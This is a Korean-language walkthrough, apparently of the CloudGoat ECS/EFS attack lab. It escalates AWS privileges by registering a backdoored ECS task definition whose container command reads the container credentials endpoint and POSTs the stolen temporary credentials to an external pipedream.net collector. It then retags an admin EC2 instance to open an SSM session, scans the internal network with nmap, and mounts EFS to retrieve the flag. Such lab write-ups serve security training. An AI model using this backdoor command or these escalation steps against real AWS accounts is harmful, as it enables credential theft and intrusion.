![Untitled](./22.png)

```python
"Sid": "VisualEditor0",
                    "Effect": "Allow",
                    "Action": [
                        "ecs:Describe*",
                        "ecs:List*",
                        "ecs:RegisterTaskDefinition",
                        "ecs:UpdateService",
                        "iam:PassRole",
                        "iam:List*",
                        "iam:Get*",
                        "ec2:CreateTags",
                        "ec2:DescribeInstances",
                        "ec2:DescribeImages",
                        "ec2:DescribeTags",
                        "ec2:DescribeSnapshots"
                    ],
                    "Resource": "*"
```

- 허용 가능한 정책들을 확인해보면 다음과 같은 형태의 자원들에 대하여 ecs, iam, ec2등 쓰기, 읽기 권한이 부여되있는 것을 확인할 수 있습니다
- 해당 권한중 환경을 수정할 수 있는 `ecs:RegisterTaskDefinition`, `ecs:UpdateService`, `ec2:createTags` 권한들을 이용할 방법을 구색하였습니다.

### ECS 클러스터 정보와 동작중인 서비스 나열

```python
aws ec2 describe-instances --query 'Reservations[*].Instances[*].[Tags]'
```

![Untitled](./23.png)

- 읽기 권한을 이용해서 해당 서버의 인스턴스를 나열한 결과들중에서 `tag` 기점으로 쿼리하여 `admin`, `cg-ruse-ec2` 두개의 ec2 인스턴스가 있는 것을 확인할 수있 습니다.
- 해당 인스턴스의 구성을 분석해보면 액세스할 수 있는 `StartSession` 태그가 부여된 것을 확인할 수있습니다.
- `cg-ruse-ec2` 에서는 true로 설정되어 있고 `admin` 에서는 false로 설정되어 있기 때문에 해당 태그가 어떤 역활을 하는지는 아직 모르기 때문에 좀더 분석을 진행해야 합니다.

![Untitled](./24.png)

- ECS 서비스에 대한 클러스터를 나열한 결과 다음과 같이 해당 클러스터에 대한 리소스 정보를 확인할 수 있습니다.

![Untitled](./25.png)

- 해당 리소스를 이용하여 서비스를 나열한 결과 `cg-webapp-cgid` 가 있는 것을 확인할 수있습니다.

![Untitled](./26.png)

- `descibe-services`로 서비스를 정의한 결과를 나열하고 해당 데이터를 확인해보면 `webapp:1`을 사용하여 실행 중인 single container를 확인할 수 있습니다. 다음 EC2 정책을 기준으로 ECS Task Definition 대한 쓰기 권한이 제한되어 있기 때문에 해당 방법을 통해서 공격 흐름을 진행합니다.

### ECS 권한 상승

![./M34.png](./M34.png)

- Elastic Container Services(ECS) Container는 orchestration 을 구현하는 AWS 서비스들 중 하나 입니다.
- ECS는 Cluster, Service, Task 해당 3가지 주요 부분으로 구성되며 Cluster는 ECS에서 가장 높은 수준의 추상화 방법입니다.
- Cluster는 Simple Task, Service Group이며 Service는 하나 이상의 Container로 구성될 수 있는 Running to Long time Task입니다.
- Task는 Task Definition에 의해 정의된 Running중인 Container입니다.
- EC2, Fargate의 두 가지 작업 배포 Type이 있습니다.
- EC2에 Task을 배포하려면 Instance 설정이 필요하지만 Fargate를 사용하면 전용 인스턴스 없이 배포가 가능합니다.

### ECS Backdoor

- 앞서 구한 Task Definition의 `webapp:1` 을 사용해서 Single Task 를 포함하는 하나의 서비스가 배포되는 것을 알수 있었습니다.
- ECS 권한을 사용하여 해당 Task Definition를 수정한 다음에 서비스를 업데이트를 하여 새로운 업데이트 버전을 사용할 수 있도록 지시가 가능합니다.
- Task Definition에서 Backdoor를 생성하려면 먼저 현재 Task Definition을 다운로드 하고 수정을 해야 합니다.
- Backdoor를 만들기 위한 정보가 필요합니다.

```python
aws ecs describe-task-definition --task-definition webapp:1
```

![Untitled](./27.png)

- 현재 작업중인 task definition 정보를 추출하여 백도어를 제작할 때 필요한 파라미터를 적기 위해서 정보를 수집합니다.

```python
{
    "containerDefinitions": [
        {
            "name": "webapp",
            "image": "python:latest",
            "cpu": 128,
            "memory": 128,
            "memoryReservation": 64,
            "portMappings": [
                {
                    "containerPort": 80,
                    "hostPort": 80,
                    "protocol": "tcp"
                }
            ],
            "essential": true,
            "entryPoint": [
                "sh",
                "-c"
            ],
            "command": [
                "/bin/sh -c \"curl 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI > data.json && curl -X POST -d @data.json https://ens65n00m5z9al9.m.pipedream.net \" "
            ],
            "environment": [],
            "mountPoints": [],
            "volumesFrom": []
        }
    ],
    "family": "webapp",
    "taskRoleArn": "arn:aws:iam::<USERID>:role/cg-ecs-role-ecs_efs_attack_cgidzng5qpdu9q",
    "executionRoleArn": "arn:aws:iam::<USERID>:role/cg-ecs-role-ecs_efs_attack_cgidzng5qpdu9q",
    "networkMode": "awsvpc",
    "volumes": [],
    "placementConstraints": [],
    "requiresCompatibilities": [
        "FARGATE"
    ],
    "cpu": "256",
    "memory": "512"
}
```

- 다음과 같은 형태로 백도어 json 파일을 제작을 하는데 이때 중요한 파라미터 라인은

```python
"command": [
 "/bin/sh -c \"curl 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI > data.json && curl -X POST -d @data.json {{CALLBACK URL}} \" "
],
```

- 백도어 작업에 필요한 명령인 linka local ddress를 이용한 IMDS 기능으로 credentials 정보를 curl http 요청을 진행해서 정보를 추출할 수 있도록 준비를 합니다
- 현재 task 정보의 파라미터로 arn 정보 역시 기입을 한후 백도어를 등록할 준비를 합니다

### 백도어 페이로드 전달

![Untitled](./28.png)

```python
{
    "taskDefinition": {
        "taskDefinitionArn": "arn:aws:ecs:us-east-1:<USERID>:task-definition/webapp:3",
        "containerDefinitions": [
            {
                "name": "webapp",
                "image": "python:latest",
                "cpu": 128,
                "memory": 128,
                "memoryReservation": 64,
                "portMappings": [
                    {
                        "containerPort": 80,
                        "hostPort": 80,
                        "protocol": "tcp"
                    }
                ],
                "essential": true,
                "entryPoint": [
                    "sh",
                    "-c"
                ],
                "command": [
                    "/bin/sh -c \"curl 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI > data.json && curl -X POST -d @data.json https://ens65n00m5z9al9.m.pipedream.net \" "
                ],
                "environment": [],
                "mountPoints": [],
                "volumesFrom": []
            }
        ],
        "family": "webapp",
        "taskRoleArn": "arn:aws:iam::<USERID>:role/cg-ecs-role-ecs_efs_attack_cgidzng5qpdu9q",
        "executionRoleArn": "arn:aws:iam::<USERID>:role/cg-ecs-role-ecs_efs_attack_cgidzng5qpdu9q",
        "networkMode": "awsvpc",
        "revision": 3,
        "volumes": [],
        "status": "ACTIVE",
        "requiresAttributes": [
            {
                "name": "com.amazonaws.ecs.capability.docker-remote-api.1.21"
            },
            {
                "name": "com.amazonaws.ecs.capability.task-iam-role"
            },
            {
                "name": "com.amazonaws.ecs.capability.docker-remote-api.1.18"
            },
            {
                "name": "ecs.capability.task-eni"
            }
        ],
        "placementConstraints": [],
        "compatibilities": [
            "EC2",
            "FARGATE"
        ],
        "requiresCompatibilities": [
            "FARGATE"
        ],
        "cpu": "256",
        "memory": "512",
        "registeredAt": "2021-08-18T06:44:41.447000+00:00",
        "registeredBy": "arn:aws:sts::<USERID>:assumed-role/cg-ec2-role-ecs_efs_attack_cgidzng5qpdu9q/i-0a14dcbb45885cb69"
    }
}
```

- 백도어 파일을 등록하였고 이에 대한 업데이트를 할 수 있도록 task definition을 사용하여 container 배포를 자동으로 시도합니다.

![Untitled](./29.png)

```python
ubuntu@ip-10-10-10-133:~$ aws ecs update-service --service arn:aws:ecs:us-east-1:<USERID>:service/cg-cluster-ecs_efs_attack_cgidzng5qpdu9q/cg-webapp-ecs_efs_attack_cgidzng5qpdu9q --cluster arn:aws:ecs:us-east-1:<USERID>:cluster/cg-cluster-ecs_efs_attack_cgidzng5qpdu9q --task-definition arn:aws:ecs:us-east-1:<USERID>:task-definition/webapp:3
{
    "service": {
        "serviceArn": "arn:aws:ecs:us-east-1:<USERID>:service/cg-cluster-ecs_efs_attack_cgidzng5qpdu9q/cg-webapp-ecs_efs_attack_cgidzng5qpdu9q",
        "serviceName": "cg-webapp-ecs_efs_attack_cgidzng5qpdu9q",
        "clusterArn": "arn:aws:ecs:us-east-1:<USERID>:cluster/cg-cluster-ecs_efs_attack_cgidzng5qpdu9q",
        "loadBalancers": [],
        "serviceRegistries": [],
        "status": "ACTIVE",
        "desiredCount": 1,
        "runningCount": 1,
        "pendingCount": 1,
        "launchType": "FARGATE",
        "platformVersion": "LATEST",
        "taskDefinition": "arn:aws:ecs:us-east-1:<USERID>:task-definition/webapp:3",
        "deploymentConfiguration": {
            "deploymentCircuitBreaker": {
                "enable": false,
                "rollback": false
            },
            "maximumPercent": 200,
            "minimumHealthyPercent": 100
        },
        "deployments": [
            {
                "id": "ecs-svc/9719804482648596889",
                "status": "PRIMARY",
                "taskDefinition": "arn:aws:ecs:us-east-1:<USERID>:task-definition/webapp:3",
                "desiredCount": 1,
                "pendingCount": 0,
                "runningCount": 0,
                "failedTasks": 0,
                "createdAt": "2021-08-18T06:47:06.407000+00:00",
                "updatedAt": "2021-08-18T06:47:06.407000+00:00",
                "launchType": "FARGATE",
                "platformVersion": "1.4.0",
                "networkConfiguration": {
                    "awsvpcConfiguration": {
                        "subnets": [
                            "subnet-00a761bd4a95363c0"
                        ],
                        "securityGroups": [
                            "sg-05636ec76dbc40c42"
                        ],
                        "assignPublicIp": "ENABLED"
                    }
                },
                "rolloutState": "IN_PROGRESS",
                "rolloutStateReason": "ECS deployment ecs-svc/9719804482648596889 in progress."
            },
            {
                "id": "ecs-svc/4820190458051897207",
                "status": "ACTIVE",
                "taskDefinition": "arn:aws:ecs:us-east-1:<USERID>:task-definition/webapp:2",
                "desiredCount": 1,
                "pendingCount": 1,
                "runningCount": 0,
                "failedTasks": 1,
                "createdAt": "2021-08-18T06:27:10.816000+00:00",
                "updatedAt": "2021-08-18T06:46:27.459000+00:00",
                "launchType": "FARGATE",
                "platformVersion": "1.4.0",
                "networkConfiguration": {
                    "awsvpcConfiguration": {
                        "subnets": [
                            "subnet-00a761bd4a95363c0"
                        ],
                        "securityGroups": [
                            "sg-05636ec76dbc40c42"
                        ],
                        "assignPublicIp": "ENABLED"
                    }
                },
                "rolloutState": "IN_PROGRESS",
                "rolloutStateReason": "ECS deployment ecs-svc/4820190458051897207 in progress."
            },
            {
                "id": "ecs-svc/4824857400021118616",
                "status": "ACTIVE",
                "taskDefinition": "arn:aws:ecs:us-east-1:<USERID>:task-definition/webapp:1",
                "desiredCount": 1,
                "pendingCount": 0,
                "runningCount": 1,
                "failedTasks": 0,
                "createdAt": "2021-08-18T04:13:26.010000+00:00",
                "updatedAt": "2021-08-18T06:27:15.322000+00:00",
                "launchType": "FARGATE",
                "platformVersion": "1.4.0",
                "networkConfiguration": {
                    "awsvpcConfiguration": {
                        "subnets": [
                            "subnet-00a761bd4a95363c0"
                        ],
                        "securityGroups": [
                            "sg-05636ec76dbc40c42"
                        ],
                        "assignPublicIp": "ENABLED"
                    }
                },
                "rolloutState": "COMPLETED",
                "rolloutStateReason": "ECS deployment ecs-svc/4824857400021118616 completed."
            }
        ],
        "roleArn": "arn:aws:iam::<USERID>:role/aws-service-role/ecs.amazonaws.com/AWSServiceRoleForECS",
        "events": [
            {
                "id": "ea4ed3a7-b03d-4c6e-9133-6d076dcefe1d",
                "createdAt": "2021-08-18T06:46:27.714000+00:00",
                "message": "(service cg-webapp-ecs_efs_attack_cgidzng5qpdu9q) has started 1 tasks: (task 32d3bb5d6566426296527e16e5a4ccc9)."
            },
            {
                "id": "8269f6f7-6a2e-423f-b91c-0172916ffc77",
                "createdAt": "2021-08-18T06:45:08.741000+00:00",
                "message": "(service cg-webapp-ecs_efs_attack_cgidzng5qpdu9q) has started 1 tasks: (task 4fcb70d2909f457e84afb72cac304ce2)."
            },
            {
                "id": "63466e77-f89a-45b0-9c8b-18459228ad8b",
                "createdAt": "2021-08-18T06:43:56.144000+00:00",
                "message": "(service cg-webapp-ecs_efs_attack_cgidzng5qpdu9q) has started 1 tasks: (task 7bad7aab42e149ccae29d102b800fb91)."
            },
            {
                "id": "89bd690d-d4b6-404a-8f11-56e702a77545",
                "createdAt": "2021-08-18T06:42:34.555000+00:00",
                "message": "(service cg-webapp-ecs_efs_attack_cgidzng5qpdu9q) has started 1 tasks: (task 9866212791fe46259ea41175d28b0b5f)."
            },
            {
                "id": "63fbfc2d-543b-4672-a1f8-4c5cc8738402",
                "createdAt": "2021-08-18T06:41:15.754000+00:00",
                "message": "(service cg-webapp-ecs_efs_attack_cgidzng5qpdu9q) has started 1 tasks: (task dd2270d0553f48dbb9939eff17a7c19b)."
            },
            {
                "id": "6c3bf886-388b-4f1d-ae58-7788048df246",
                "createdAt": "2021-08-18T06:39:58.741000+00:00",
                "message": "(service cg-webapp-ecs_efs_attack_cgidzng5qpdu9q) has started 1 tasks: (task fbef54ca53934164afeda71fc0881141)."
            },
            {
                "id": "149161f7-d1a2-464f-b20b-250a86ddd757",
                "createdAt": "2021-08-18T06:38:29.878000+00:00",
                "message": "(service cg-webapp-ecs_efs_attack_cgidzng5qpdu9q) has started 1 tasks: (task 0ba11ac4ec694305802aa6479f06ad4e)."
            },
            {
                "id": "3783105d-8c9d-4077-86e0-2fc329c0b615",
                "createdAt": "2021-08-18T06:37:12.019000+00:00",
                "message": "(service cg-webapp-ecs_efs_attack_cgidzng5qpdu9q) has started 1 tasks: (task 8a2e94bfa8c24bc9862c521a0150b64f)."
            },
            {
                "id": "24696996-6762-43da-a403-111656c8ec01",
                "createdAt": "2021-08-18T06:35:44.649000+00:00",
                "message": "(service cg-webapp-ecs_efs_attack_cgidzng5qpdu9q) has started 1 tasks: (task 61b732247a834251aba63eb28c3f0c38)."
            },
            {
                "id": "a5cf180b-4490-4e1d-957b-321904e41b66",
                "createdAt": "2021-08-18T06:34:22.101000+00:00",
                "message": "(service cg-webapp-ecs_efs_attack_cgidzng5qpdu9q) has started 1 tasks: (task e19aff3b687b4975aa794d075b205d2f)."
            },
            {
                "id": "fe83791c-0168-48c8-ba93-564e5227e3d0",
                "createdAt": "2021-08-18T06:32:52.063000+00:00",
                "message": "(service cg-webapp-ecs_efs_attack_cgidzng5qpdu9q) has started 1 tasks: (task b68f025b793947649e058d7afcfe2b57)."
            },
            {
                "id": "b5b1ccc4-8b67-4ef3-99bb-a72b4dd80c22",
                "createdAt": "2021-08-18T06:31:19.764000+00:00",
                "message": "(service cg-webapp-ecs_efs_attack_cgidzng5qpdu9q) has started 1 tasks: (task a10f9b3b45364e23ac50401922236117)."
            },
            {
                "id": "aeb00c7f-5805-476b-bfd1-7264d019a813",
                "createdAt": "2021-08-18T06:29:58.538000+00:00",
                "message": "(service cg-webapp-ecs_efs_attack_cgidzng5qpdu9q) has started 1 tasks: (task 55923c179d6646a2bcf24238c555f917)."
            },
            {
                "id": "5b833bd6-6ab7-42aa-b9cd-d139f2f35815",
                "createdAt": "2021-08-18T06:28:38.731000+00:00",
                "message": "(service cg-webapp-ecs_efs_attack_cgidzng5qpdu9q) has started 1 tasks: (task 98762156d3cd4755810d931b06a52f6d)."
            },
            {
                "id": "67e677cc-d821-4b6e-abe9-ca3edeabe155",
                "createdAt": "2021-08-18T06:27:15.719000+00:00",
                "message": "(service cg-webapp-ecs_efs_attack_cgidzng5qpdu9q) has started 1 tasks: (task 82997be7cdda44e1aa3817e441341590)."
            },
            {
                "id": "442e3c48-67cf-4403-9169-35ead9faf92b",
                "createdAt": "2021-08-18T04:14:01.385000+00:00",
                "message": "(service cg-webapp-ecs_efs_attack_cgidzng5qpdu9q) has reached a steady state."
            },
            {
                "id": "715906ed-8c68-4416-8289-155619a6474e",
                "createdAt": "2021-08-18T04:14:01.384000+00:00",
                "message": "(service cg-webapp-ecs_efs_attack_cgidzng5qpdu9q) (deployment ecs-svc/4824857400021118616) deployment completed."
            },
            {
                "id": "0eb4bc07-c02f-46bf-83f1-62154dc72c31",
                "createdAt": "2021-08-18T04:13:33.217000+00:00",
                "message": "(service cg-webapp-ecs_efs_attack_cgidzng5qpdu9q) has started 1 tasks: (task 777f705ec2144111ad094049dd4ea924)."
            }
        ],
        "createdAt": "2021-08-18T04:13:26.010000+00:00",
        "placementConstraints": [],
        "placementStrategy": [],
        "networkConfiguration": {
            "awsvpcConfiguration": {
                "subnets": [
                    "subnet-00a761bd4a95363c0"
                ],
                "securityGroups": [
                    "sg-05636ec76dbc40c42"
                ],
                "assignPublicIp": "ENABLED"
            }
        },
        "schedulingStrategy": "REPLICA",
        "createdBy": "arn:aws:iam::<USERID>:user/cloudgoat",
        "enableECSManagedTags": false,
        "propagateTags": "NONE",
        "enableExecuteCommand": false
    }
}
```

![Untitled](./30.png)

- ECS가 새로운 백도어 컨테이너인 `webapp:3` 를 등록하면서 `webapp:1` 도 역시 계속 해서 동작중인 것을 확인할 수 있습니다.
- Task Definition가 Credential를 POST하게 되면 종료가 되는데 결과적으로 webapp:1은 계속 실행되는 거고 ECS는 webapp:1을 지속적으로 재배포하면서 정기적으로 Credential 정보를 보내는 역활을 하는 것 입니다.

![Untitled](./31.png)

- backdoor container가 페이로드를 성공적으로 동작시키고 Temp Credential 을 외부 웹사이트로 POST 요청하여 해당 Credential 정보를 탈취할 수있습니다.
- 해당 정보를 토대로 `cg-ecs-role` 에 적용할 수 있습니다.

### Admin EC2로 Pivot

- 백도어로 전달되는 credential 정보를 profile 등록해두고 해당 Conatiner에 연결된 정책들을 확인하였습니다.

```python
aws ec2 describe-instances --query 'Reservations[*].Instances[*].[Tags]' --profile ecs_role_efs
```

![Untitled](./32.png)

- 해당 정책에서 `StartSession` 에서 True라는 tag를 확인할 수있으며 EC2에서 StartSession을 허용하는 것을 확인할 수 있습니다.

AWS system manager and ec2 action 

```python
aws ec2 create-tags --resource i-0db441693a5e80703 --tags Key=StartSession,Value=true
```

```python
"AmiLaunchIndex": 0,
"ImageId": "ami-0a313d6098716f372",
"InstanceId": "i-0db441693a5e80703",
"InstanceType": "t2.micro",
"LaunchTime": "2021-08-18T04:13:12+00:00",
"Monitoring": {
    "State": "disabled"
},
```

```python
aws ec2 create-tags --resource i-0db441693a5e80703 --tags Key=StartSession, Value=true

aws ssm start-session --target i-0db441693a5e80703 --profile ecs_role_efs
```

- system manager는 EC2에 대한 다양한 관리 작업을 수행하고 관리형 EC2에 SSH로 연결할 수 있도록 세션을 시작할 수 있는 AWS 서비스입니다.
- Admin EC2의 태그 값이 False로 설정된 것을 확인했었는 이를 편집할 수 있는 권한인 `ruse ec2` 를 이용하여 Admin EC2를 수정하고 원격 세션을 시작할 수 있습니다.

![Untitled](./33.png)

### 포트 스캐닝

- 처음에 `ruse EC2` 를 사용하여 연결된 role 정보를 추출하는데 이때 `EFS:ClientMount` 라는 권한을 확인할 수 있었습니다.

![Untitled](./34.png)

- `EFS:ClientMount` 권한에서 EFS를 탑재할 수 있는데 EFS를 나열할 수 없는 경우에는 Shared Mount를 진행해야 합니다. 그렇기 때문에 로컬 내에서존재하는 EFS 포트 스캐닝을 진행해야 합니다.

![Untitled](./35.png)

- `snap` 으로 nmap 도구를 연결한후 로컬 내에 스캐닝을 진행합니다. 만약에 `snap`으로 nmap 도구를 다운로드 받았을 경우에 snap에게 네트워크를 제어할 수있도록 명령을 주어야 합니다.

```python
sudo snap connect nmap:network-control
```

![Untitled](./36.png)

- 다음과 같이 2049 포트가 열려 있는 것을 확인할 수 있으며 EFS 역시 대부분의 파일 공유와 만찬가지로 포트 2049가 열려 있어야 합니다.
- 내부 로컬내에서 열려 있는 ip 대역은 `10.10.10.104` 임을 확인할 수있습니다.

### EFS Shared Mount and FLAG!

- 스캐닝을 통해서 shared mount를 진행할 수 있습니다.

![Untitled](./37.png)

- shared Mount가 완료되면 `/admin` 디렉토리를 찾아가 디렉토리 내에서 base64로 디코딩된 플래그를 찾을 수 있게 됩니다.

![Untitled](./38.png)

![Untitled](./39.png)

- 플래그를 확인할 수 있습니다.

```toc
```